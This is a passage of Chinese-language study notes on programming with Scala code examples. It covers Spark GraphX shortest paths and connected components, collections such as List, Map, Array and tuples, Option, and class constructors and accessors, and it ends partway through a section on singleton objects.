_) =&gt; <span class="keyword">if</span> (id == sourceId) <span class="number">0.0</span> <span class="keyword">else</span> <span class="type">Double</span>.<span class="type">PositiveInfinity</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">val</span> disGraph: <span class="type">Graph</span>[<span class="type">Double</span>, <span class="type">Int</span>] = initailGraph.pregel(<span class="type">Double</span>.<span class="type">PositiveInfinity</span>)(</span><br><span class="line">      <span class="comment">// 两个消息来的时候，取其中的最小路径</span></span><br><span class="line">      (id, dist, newDist) =&gt; math.min(dist, newDist),</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Send Message 函数</span></span><br><span class="line">      triplet =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (triplet.srcAttr + triplet.attr &lt; triplet.dstAttr) &#123;</span><br><span class="line">          <span class="type">Iterator</span>((triplet.dstId, triplet.srcAttr + triplet.attr))</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">          <span class="type">Iterator</span>.empty</span><br><span class="line">      &#125;,</span><br><span class="line"></span><br><span class="line">      <span class="comment">// mergeMsg</span></span><br><span class="line">      (dista, distb) =&gt; math.min(dista, distb)</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    disGraph.vertices.foreach(println)</span><br><span class="line"></span><br><span class="line">    sc.stop()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span>(<span class="params">name: <span class="type">String</span>, age: <span class="type">Int</span>, inDegress: <span class="type">Int</span>, outDegress: <span class="type">Int</span></span>)</span></span><br></pre></td></tr></table></figure>

<h2 id="Spark-GraphX从文件生成图，生成连通图"><a href="#Spark-GraphX从文件生成图，生成连通图" class="headerlink" title="Spark GraphX从文件生成图，生成连通图"></a>Spark GraphX从文件生成图，生成连通图</h2><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">GraphXExample2</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    <span class="keyword">val</span> conf: <span class="type">SparkConf</span> = <span class="keyword">new</span> <span class="type">SparkConf</span>().setAppName(<span class="keyword">this</span>.getClass.getCanonicalName)</span><br><span class="line">      .setMaster(<span class="string">&quot;local[*]&quot;</span>)</span><br><span class="line">    <span class="keyword">val</span> sc = <span class="keyword">new</span> <span class="type">SparkContext</span>(conf)</span><br><span class="line">    sc.setLogLevel(<span class="string">&quot;warn&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 生成图</span></span><br><span class="line">    <span class="keyword">val</span> graph: <span class="type">Graph</span>[<span class="type">Int</span>, <span class="type">Int</span>] = <span class="type">GraphLoader</span>.edgeListFile(sc, <span class="string">&quot;data/graph.dat&quot;</span>)</span><br><span class="line"></span><br><span class="line">    graph.vertices.foreach(println)</span><br><span class="line">    graph.edges.foreach(println)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用连通图算法</span></span><br><span class="line">    graph.connectedComponents()</span><br><span class="line">        .vertices</span><br><span class="line">      .sortBy(_._2)</span><br><span class="line">        .foreach(println)</span><br><span class="line"></span><br><span class="line">    sc.stop()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Scala基础"><a href="#Scala基础" class="headerlink" title="Scala基础"></a>Scala基础</h1><h2 id="List"><a href="#List" class="headerlink" title="List"></a>List</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>List代表元素顺序固定的不可变的链表，它是Seq的子类，在Scala编程中经常使用。</p>
<p>List列表有头部和尾部的概念，可以分别使用head和tail方法来获取：</p>
<ul>
<li>head返回的是列表第一个元素的值</li>
<li>tail返回的是<strong>除第一个元素外</strong>的其它元素构成的新列表</li>
</ul>
<p>Scala定义了一个空列表对象Nil，定义为List[Nothing]</p>
<p>借助 Nil 可将多个元素用操作符 <strong>::</strong> 添加到列表头部，常用来初始化列表；</p>
<p>操作符 <strong>:::</strong> 用于拼接两个列表</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 不可变集合</span></span><br><span class="line">    <span class="keyword">val</span> list1: <span class="type">List</span>[<span class="type">Int</span>] = <span class="number">1</span>::<span class="number">2</span>::<span class="type">Nil</span></span><br><span class="line">    println(list1)</span><br><span class="line">    println(list1.head)</span><br><span class="line">    println(list1.tail)</span><br><span class="line"><span class="comment">//    List(1, 2)</span></span><br><span class="line"><span class="comment">//    1</span></span><br><span class="line"><span class="comment">//    List(2)</span></span><br><span class="line">    <span class="keyword">val</span> list2: <span class="type">List</span>[<span class="type">Int</span>] = <span class="number">3</span>::<span class="number">4</span>::<span class="type">Nil</span></span><br><span class="line">    <span class="keyword">val</span> list3: <span class="type">List</span>[<span class="type">Int</span>] = list1:::list2</span><br><span class="line">    println(list3)</span><br><span class="line"><span class="comment">//    List(1, 2, 3, 4)</span></span><br></pre></td></tr></table></figure>

<h3 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h3><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quickSort</span></span>(lst:<span class="type">List</span>[<span class="type">Int</span>]):<span class="type">List</span>[<span class="type">Int</span>]= &#123;</span><br><span class="line">    lst <span class="keyword">match</span> &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="type">Nil</span>=&gt;<span class="type">Nil</span></span><br><span class="line">      <span class="keyword">case</span> head::tail=&gt;&#123;</span><br><span class="line">        <span class="keyword">val</span> (less,greater) = tail.partition((_: <span class="type">Int</span>) &lt; head)</span><br><span class="line">        quickSort(less):::(head::quickSort(greater))</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h3 id="可变list"><a href="#可变list" class="headerlink" title="可变list"></a>可变list</h3><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> scala.collection.mutable.<span class="type">ListBuffer</span></span><br></pre></td></tr></table></figure>

<p>获取元素（使用括号访问(索引值)）<br>添加元素（+=）<br>追加一个列表（++=）<br>更改元素（使用括号获取元素，然后进行赋值）<br>删除元素（-=）<br>转换为List（toList）<br>转换为Array（toArray)</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line">    <span class="comment">// 可变集合</span></span><br><span class="line">    <span class="keyword">import</span> scala.collection.mutable.<span class="type">ListBuffer</span></span><br><span class="line">    <span class="keyword">val</span> buffer: <span class="type">ListBuffer</span>[<span class="type">Int</span>] = <span class="type">ListBuffer</span>()</span><br><span class="line">    buffer+=<span class="number">3</span></span><br><span class="line">    buffer+=<span class="number">10</span></span><br><span class="line">    buffer+=<span class="number">1</span></span><br><span class="line">    buffer+=<span class="number">6</span></span><br><span class="line">    println(buffer)</span><br><span class="line">    buffer++=<span class="type">ListBuffer</span>(<span class="number">2</span>,<span class="number">3</span>,<span class="number">15</span>,<span class="number">4</span>)</span><br><span class="line">    println(buffer)</span><br><span class="line">    println(buffer(<span class="number">0</span>))</span><br><span class="line"><span class="comment">//    ListBuffer(3, 10, 1, 6)</span></span><br><span class="line"><span class="comment">//    ListBuffer(3, 10, 1, 6, 2, 3, 15, 4)</span></span><br><span class="line"><span class="comment">//    3s</span></span><br></pre></td></tr></table></figure>

<h2 id="Scala-Iterator（迭代器）"><a href="#Scala-Iterator（迭代器）" class="headerlink" title="Scala Iterator（迭代器）"></a>Scala Iterator（迭代器）</h2><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><ul>
<li>Scala Iterator（迭代器）不是一个集合，它是一种用于访问集合的方法。</li>
<li>迭代器 it 的两个基本操作是 <strong>next</strong> 和 <strong>hasNext</strong>。</li>
<li>调用 <strong>it.next()</strong> 会返回迭代器的下一个元素，并且更新迭代器的状态。</li>
<li>调用 <strong>it.hasNext()</strong> 用于检测集合中是否还有元素。</li>
</ul>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> lst = <span class="type">List</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line">  <span class="keyword">val</span> iterator: <span class="type">Iterator</span>[<span class="type">Int</span>] = lst.iterator</span><br><span class="line">  <span class="keyword">while</span>(iterator.hasNext) &#123;</span><br><span class="line">    println(iterator.next())</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h2 id="Option的类型"><a href="#Option的类型" class="headerlink" title="Option的类型"></a>Option的类型</h2><p>Option有两个子类别，Some和None。当程序回传Some的时候，代表这个函式成功地给了你一个String，而你可以透过get()函数拿到那个String，如果程序返回的是None，则代表没有字符串可以给你。</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">Option_Test</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    <span class="keyword">val</span> grade = <span class="type">Map</span>(<span class="string">&quot;a&quot;</span>-&gt;<span class="number">90</span>,<span class="string">&quot;b&quot;</span>-&gt;<span class="number">60</span>,<span class="string">&quot;c&quot;</span>-&gt;<span class="number">80</span>)</span><br><span class="line">    <span class="keyword">val</span> temp: <span class="type">Int</span> = grade(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">    println(temp)</span><br><span class="line">    <span class="comment">// println(grade(&quot;q&quot;)) error</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getGrade</span></span>(name:<span class="type">String</span>)=&#123;</span><br><span class="line">      <span class="keyword">val</span> maybeInt: <span class="type">Option</span>[<span class="type">Int</span>] = grade.get(name)</span><br><span class="line">      maybeInt <span class="keyword">match</span> &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="type">None</span>=&gt;println(<span class="string">&quot;None&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> <span class="type">Some</span>(maybeInt)=&gt;println(maybeInt)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    getGrade(<span class="string">&quot;b&quot;</span>)</span><br><span class="line">    getGrade(<span class="string">&quot;d&quot;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Map类型"><a href="#Map类型" class="headerlink" title="Map类型"></a>Map类型</h2><p>如果要使用可变Map，必须导入scala.collection.mutable.Map</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">val</span> stringToInt = <span class="type">Map</span>(<span class="string">&quot;a&quot;</span> -&gt; <span class="number">50</span>, <span class="string">&quot;b&quot;</span> -&gt; <span class="number">60</span>, <span class="string">&quot;c&quot;</span> -&gt; <span class="number">80</span>)</span><br><span class="line">    <span class="keyword">val</span> stringToInt2 = <span class="type">Map</span>((<span class="string">&quot;a&quot;</span>,<span class="number">50</span>), (<span class="string">&quot;b&quot;</span>,<span class="number">60</span>), (<span class="string">&quot;c&quot;</span>,<span class="number">80</span>))</span><br><span class="line">    println(stringToInt)</span><br><span class="line">    println(stringToInt2)</span><br><span class="line">    println(stringToInt.get(<span class="string">&quot;a&quot;</span>))</span><br><span class="line">    println(stringToInt.get(<span class="string">&quot;q&quot;</span>))</span><br><span class="line">    println(stringToInt.getOrElse(<span class="string">&quot;q&quot;</span>,<span class="number">0</span>))</span><br><span class="line"><span class="comment">//    Map(a -&gt; 50, b -&gt; 60, c -&gt; 80)</span></span><br><span class="line"><span class="comment">//    Map(a -&gt; 50, b -&gt; 60, c -&gt; 80)</span></span><br><span class="line"><span class="comment">//    Some(50)</span></span><br><span class="line"><span class="comment">//    None</span></span><br><span class="line"><span class="comment">//    0</span></span><br></pre></td></tr></table></figure>

<h3 id="可变map"><a href="#可变map" class="headerlink" title="可变map"></a>可变map</h3><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line">    <span class="comment">// 可变map</span></span><br><span class="line">    <span class="keyword">val</span> b: mutable.<span class="type">Map</span>[<span class="type">String</span>, <span class="type">Int</span>] = scala.collection.mutable.<span class="type">Map</span>(<span class="string">&quot;a&quot;</span> -&gt; <span class="number">1</span>, <span class="string">&quot;b&quot;</span> -&gt; <span class="number">2</span>, <span class="string">&quot;c&quot;</span> -&gt; <span class="number">3</span>)</span><br><span class="line">    b(<span class="string">&quot;a&quot;</span>) = <span class="number">2</span></span><br><span class="line">    <span class="comment">// 增加了一个新元素</span></span><br><span class="line">    b(<span class="string">&quot;d&quot;</span>) = <span class="number">4</span></span><br><span class="line">    <span class="comment">// 用 + 添加新的元素；用 – 删除元素</span></span><br><span class="line">    b += (<span class="string">&quot;e&quot;</span> -&gt; <span class="number">1</span>, <span class="string">&quot;f&quot;</span> -&gt; <span class="number">2</span>)</span><br><span class="line">    b -= <span class="string">&quot;a&quot;</span></span><br><span class="line">    println(b)  <span class="comment">// 乱序</span></span><br><span class="line"><span class="comment">//    Map(e -&gt; 1, b -&gt; 2, d -&gt; 4, c -&gt; 3, f -&gt; 2)</span></span><br></pre></td></tr></table></figure>

<h3 id="拉链操作创建map"><a href="#拉链操作创建map" class="headerlink" title="拉链操作创建map"></a>拉链操作创建map</h3><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line">    <span class="comment">// 拉链操作创建map</span></span><br><span class="line">    <span class="keyword">val</span> p: <span class="type">Array</span>[<span class="type">Int</span>] = <span class="type">Array</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">val</span> q: <span class="type">Array</span>[<span class="type">String</span>] = <span class="type">Array</span>(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>)</span><br><span class="line">    <span class="keyword">val</span> tuples: <span class="type">Array</span>[(<span class="type">Int</span>, <span class="type">String</span>)] = p.zip(q)</span><br><span class="line">    <span class="keyword">val</span> map: scala.collection.immutable.<span class="type">Map</span>[<span class="type">Int</span>, <span class="type">String</span>] = p.zip(q).toMap</span><br><span class="line">    println(tuples)</span><br><span class="line">    println(map)</span><br><span class="line"><span class="comment">//    Map(e -&gt; 1, b -&gt; 2, d -&gt; 4, c -&gt; 3, f -&gt; 2)</span></span><br><span class="line"><span class="comment">//    [Lscala.Tuple2;@51e2adc7 </span></span><br><span class="line"><span class="comment">//    Map(1 -&gt; a, 2 -&gt; b, 3 -&gt; c)</span></span><br></pre></td></tr></table></figure>

<h2 id="Array"><a href="#Array" class="headerlink" title="Array"></a>Array</h2><p>开始学的时候有些不重视，花招还是挺多的</p>
<p>数组可索引、类型一致、长度不变</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">val</span> nums: <span class="type">Array</span>[<span class="type">Int</span>] = <span class="keyword">new</span> <span class="type">Array</span>[<span class="type">Int</span>](<span class="number">10</span>)</span><br><span class="line">    nums(<span class="number">8</span>) = <span class="number">10</span></span><br><span class="line">    println(nums.toBuffer)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">val</span> nums2: <span class="type">Array</span>[<span class="type">Int</span>] = <span class="type">Array</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>)</span><br><span class="line">    println(nums2.mkString(<span class="string">&quot;,&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">val</span> nums3: <span class="type">Array</span>[<span class="type">Int</span>] = (<span class="number">1</span> to <span class="number">10</span>).toArray</span><br><span class="line">    println(nums3.toBuffer)</span><br><span class="line"><span class="comment">//    ArrayBuffer(0, 0, 0, 0, 0, 0, 0, 0, 10, 0)</span></span><br><span class="line"><span class="comment">//    1,2,3,5,6</span></span><br><span class="line"><span class="comment">//    ArrayBuffer(1, 2, 3, 4, 5, 6, 7, 8, 9, 10)</span></span><br></pre></td></tr></table></figure>

<h3 id="变长数组ArrayBuffffer"><a href="#变长数组ArrayBuffffer" class="headerlink" title="变长数组ArrayBuffffer"></a>变长数组ArrayBuffffer</h3><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line">    <span class="comment">// 变长数组</span></span><br><span class="line">    <span class="keyword">val</span> num: <span class="type">ArrayBuffer</span>[<span class="type">Int</span>] = <span class="type">ArrayBuffer</span>[<span class="type">Int</span>]()</span><br><span class="line">    num+=<span class="number">1</span></span><br><span class="line">    num++=<span class="type">ArrayBuffer</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line">    println(num)</span><br><span class="line">    num.append(<span class="number">100</span>,<span class="number">101</span>)</span><br><span class="line">    println(num)</span><br><span class="line">    num.insert(<span class="number">0</span>,<span class="number">5</span>,<span class="number">5</span>)</span><br><span class="line">    println(num)</span><br><span class="line">    <span class="comment">// 移除最后2元素</span></span><br><span class="line">    num.trimEnd(<span class="number">2</span>)</span><br><span class="line">    <span class="comment">// 移除最开始的一个或者多个元素</span></span><br><span class="line">    num.trimStart(<span class="number">1</span>)</span><br><span class="line">    <span class="comment">// 从下标2处移除一个或者多个元素</span></span><br><span class="line">    println(num)</span><br><span class="line">    num.remove(<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line">    println(num)</span><br><span class="line"><span class="comment">//    ArrayBuffer(1, 1, 2, 3, 4)</span></span><br><span class="line"><span class="comment">//    ArrayBuffer(1, 1, 2, 3, 4, 100, 101)</span></span><br><span class="line"><span class="comment">//    ArrayBuffer(5, 5, 1, 1, 2, 3, 4, 100, 101)</span></span><br><span class="line"><span class="comment">//    ArrayBuffer(5, 1, 1, 2, 3, 4)</span></span><br><span class="line"><span class="comment">//    ArrayBuffer(5, 1, 3, 4)</span></span><br></pre></td></tr></table></figure>

<h3 id="多维数组Array-ofDim"><a href="#多维数组Array-ofDim" class="headerlink" title="多维数组Array.ofDim"></a>多维数组Array.ofDim</h3><p>通过Array的ofDim方法来定义一个多维的数组，多少行，多少列，都是自己说了算</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line">    <span class="comment">// 3*4数组</span></span><br><span class="line">    <span class="keyword">val</span> dim: <span class="type">Array</span>[<span class="type">Array</span>[<span class="type">Int</span>]] = <span class="type">Array</span>.ofDim[<span class="type">Int</span>](<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line">    dim(<span class="number">1</span>)(<span class="number">1</span>) = <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">for</span>(i&lt;<span class="number">-0</span> to <span class="number">2</span>;j&lt;<span class="number">-0</span> to <span class="number">3</span>) &#123;</span><br><span class="line">      print(dim(i)(j)+<span class="string">&quot; &quot;</span>)</span><br><span class="line">      <span class="keyword">if</span>(j==<span class="number">3</span>) println()</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//    0 0 0 0</span></span><br><span class="line"><span class="comment">//    0 100 0 0</span></span><br><span class="line"><span class="comment">//    0 0 0 0</span></span><br></pre></td></tr></table></figure>

<h2 id="元组tuple"><a href="#元组tuple" class="headerlink" title="元组tuple"></a>元组tuple</h2><p>元组是不同类型的值的集合，元组中的元素可以是不同的数据类型，元组的元素个数上限是22个</p>
<p>Tuple的访问形式比较特殊。元组的下标从1开始</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">Tuple_Test</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    <span class="keyword">val</span> a: (<span class="type">Int</span>, <span class="type">Double</span>, <span class="type">String</span>, <span class="type">Char</span>) = (<span class="number">1</span>, <span class="number">1.2</span>, <span class="string">&quot;ad&quot;</span>, &#x27;d&#x27;)</span><br><span class="line">    <span class="keyword">val</span> b: (<span class="type">Int</span>, <span class="type">Double</span>, <span class="type">String</span>, <span class="type">Char</span>) = <span class="type">Tuple4</span>(<span class="number">1</span>, <span class="number">1.2</span>, <span class="string">&quot;ad&quot;</span>, &#x27;d&#x27;)</span><br><span class="line">    println(a==b)   <span class="comment">// true</span></span><br><span class="line">    println(a._1)   <span class="comment">// 1</span></span><br><span class="line">    a.productIterator.foreach(println)  <span class="comment">// loop</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="None-Nothing-Null-Nil"><a href="#None-Nothing-Null-Nil" class="headerlink" title="None,Nothing,Null,Nil"></a>None,Nothing,Null,Nil</h2><p>Null是所有AnyRef的子类，在scala的类型系统中，AnyRef是Any的子类，同时Any子类的还有AnyVal。对应java值类型的所有类型都是AnyVal的子类。所以Null可以赋值给所有的引用类型(AnyRef)，不能赋值给值类型，这个java的语义是相同的。 null是Null的唯一对象 </p>
<p>Nothing是所有类型的子类，它没有对象，但是可以定义类型，如果一个类型抛出异常，那这个返回值类型就是Nothing</p>
<p>Nil是一个空的List，定义为List[Nothing]，根据List的定义List[+A]，所有Nil是所有List[T]的子类。</p>
<p>None是一个object，是Option的子类型</p>
<h2 id="类与对象"><a href="#类与对象" class="headerlink" title="类与对象"></a>类与对象</h2><p>了解一下</p>
<h3 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h3><p>在Scala中，类并不用声明为public；</p>
<p>Scala源文件中可以包含多个类，所有这些类都具有公有可见性；</p>
<p>val修饰的变量（常量），值不能改变，只提供getter方法，没有setter方法；</p>
<p>var修饰的变量，值可以改变，对外提供getter、setter方法；</p>
<p>如果没有定义构造器，类会有一个默认的无参构造器；</p>
<h3 id="基础类的注意事项"><a href="#基础类的注意事项" class="headerlink" title="基础类的注意事项"></a>基础类的注意事项</h3><p>Scala中声明一个字段，必须显示的初始化，然后根据初始化的数据类型自动推断其类型，字段类型可以省略 </p>
<p> _ 表示一个占位符，编译器会根据变量的数据类型赋予相应的初始值 </p>
<p>使用占位符，变量类型必须指定 </p>
<p> _ 对应的默认值:整型默认值0；浮点型默认值0.0；String与引用类型，默认值null; Boolean默认值false</p>
<p>val修饰的变量不能使用占位符</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> name = <span class="string">&quot;xiaoyuyu&quot;</span></span><br><span class="line">  <span class="keyword">var</span> nickName:<span class="type">String</span> = _</span><br><span class="line">  <span class="keyword">var</span> age =<span class="number">20</span></span><br><span class="line">  <span class="comment">// 类私有字段,有私有的getter方法和setter方法</span></span><br><span class="line">  <span class="comment">// 在类的内部可以访问，其伴生对象也可以访问</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">var</span> hobby:<span class="type">String</span> = _</span><br><span class="line">  <span class="comment">// 对象私有字段,访问权限更加严格，只能在当前类中访问</span></span><br><span class="line">  <span class="keyword">private</span>[<span class="keyword">this</span>] <span class="keyword">val</span> pwd = <span class="string">&quot;123456&quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">hello</span></span>(): <span class="type">Unit</span> = &#123;</span><br><span class="line">    println(<span class="string">&quot;hello &quot;</span> + name)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">class_Test</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    <span class="keyword">val</span> person = <span class="keyword">new</span> <span class="type">Person</span>()</span><br><span class="line">    <span class="comment">//注意：如果使用对象的属性加上 _= 给var修饰的属性进行重新赋值，其实就是调用age_=这个setter方法</span></span><br><span class="line">    person.name_=(<span class="string">&quot;jack&quot;</span>)</span><br><span class="line">    person.age = <span class="number">23</span></span><br><span class="line">    <span class="comment">//直接调用类的属性，其实就是调用getter方法</span></span><br><span class="line">    println(person.age)</span><br><span class="line">    person.hello()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="自定义getter-setter"><a href="#自定义getter-setter" class="headerlink" title="自定义getter setter"></a>自定义getter setter</h4><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span> </span>&#123; </span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">var</span> _leg = <span class="number">0</span> </span><br><span class="line"></span><br><span class="line">  <span class="comment">//自定义getter方法 </span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">leg</span> </span>= _leg </span><br><span class="line"></span><br><span class="line">	<span class="comment">//自定义setter方法 </span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">leg_=</span></span>(newLeg: <span class="type">Int</span>) &#123; </span><br><span class="line">		_leg = newLeg </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用自定义getter和setter方法 </span></span><br><span class="line"><span class="keyword">val</span> dog = <span class="keyword">new</span> <span class="type">Dog</span> </span><br><span class="line">dog.leg_=(<span class="number">4</span>) </span><br><span class="line">println(dog.leg)</span><br></pre></td></tr></table></figure>

<h4 id="bean属性"><a href="#bean属性" class="headerlink" title="bean属性"></a>bean属性</h4><p>JavaBean规范把Java属性定义为一堆getter和setter方法。</p>
<p>类似于Java，当将Scala字段标注为 @BeanProperty时，getFoo和setFoo方法会自动生成。</p>
<p>使用@BeanProperty并不会影响Scala自己自动生成的getter和setter方法。</p>
<p>在使用时需要导入包scala.beans.BeanProperty</p>
<h4 id="构造器"><a href="#构造器" class="headerlink" title="构造器"></a>构造器</h4><p>如果没有定义构造器，Scala类中会有一个默认的无参构造器；Scala当中类的构造器分为两种：主构造器和辅助构造器；</p>
<p>主构造器的定义与类的定义交织在一起，将主构造器的参数直接放在类名之后。</p>
<p>当主构造器的参数不用var或val修饰时，参数会生成类的私有val成员。</p>
<p>Scala中，所有的辅助构造器都必须调用另外一个构造器，另外一个构造器可以是辅助构造器，也可以是主构造器。</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="comment">//主构造器直接定义在类中，其代码不包含在任何方法中</span></span><br><span class="line"><span class="comment">// Scala中的主构造器与类名交织在一起，类名后面的参数即为主构造器的参数</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span>(<span class="params">name:<span class="type">String</span>,var age:<span class="type">Int</span></span>)</span>&#123;</span><br><span class="line">  <span class="comment">//类中不在任何方法中的代码，都属于主构造器的代码。</span></span><br><span class="line">  <span class="comment">// 创建类的对象时会去执行主构造器的代码。下面的println代码就是主构造器的一部分</span></span><br><span class="line">  println(name)</span><br><span class="line">  println(age)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> gender:<span class="type">String</span> = _</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">this</span></span>(name:<span class="type">String</span>,age:<span class="type">Int</span>,gender: <span class="type">String</span>) &#123;</span><br><span class="line">    <span class="comment">//每个辅助构造器，都必须以其他辅助构造器，或者主构造器的调用作为第一句代码</span></span><br><span class="line">    <span class="keyword">this</span>(name,age)</span><br><span class="line">    <span class="keyword">this</span>.gender = gender</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> color:<span class="type">String</span> = _</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">this</span></span>(name: <span class="type">String</span>, age: <span class="type">Int</span>, gender: <span class="type">String</span>, color: <span class="type">String</span>) &#123;</span><br><span class="line">    <span class="comment">//调用上面的辅助构造器</span></span><br><span class="line">    <span class="keyword">this</span>(name, age, gender)</span><br><span class="line">    <span class="keyword">this</span>.color = color</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">Dog</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    <span class="keyword">val</span> dog1=<span class="keyword">new</span> <span class="type">Dog</span>(<span class="string">&quot;狗蛋&quot;</span>,<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">val</span> dog2=<span class="keyword">new</span> <span class="type">Dog</span>(<span class="string">&quot;旺才&quot;</span>,<span class="number">3</span>,<span class="string">&quot;雄性&quot;</span>)</span><br><span class="line">    <span class="keyword">val</span> dog3=<span class="keyword">new</span> <span class="type">Dog</span>(<span class="string">&quot;小六&quot;</span>,<span class="number">5</span>,<span class="string">&quot;雄性&quot;</span>,<span class="string">&quot;黑色&quot;</span>)</span><br><span class="line"><span class="comment">//    狗蛋</span></span><br><span class="line"><span class="comment">//    4</span></span><br><span class="line"><span class="comment">//    旺才</span></span><br><span class="line"><span class="comment">//    3</span></span><br><span class="line"><span class="comment">//    小六</span></span><br><span class="line"><span class="comment">//    5</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h3><h4 id="单例对象"><a href="#单例对象" class="headerlink" title="单例对象"></a>单例对象</h4><p>java中单例模式主要用到了静态，但是scala中没有static关键字，但是scala可以用伴生类于伴生对象来模拟静态，但首先我们需要了解单例对象</p>
<p>Scala中的单例对象具有如下特点：</p>
<ul>
<li>1、创建单例对象不需要使用new关键字</li>
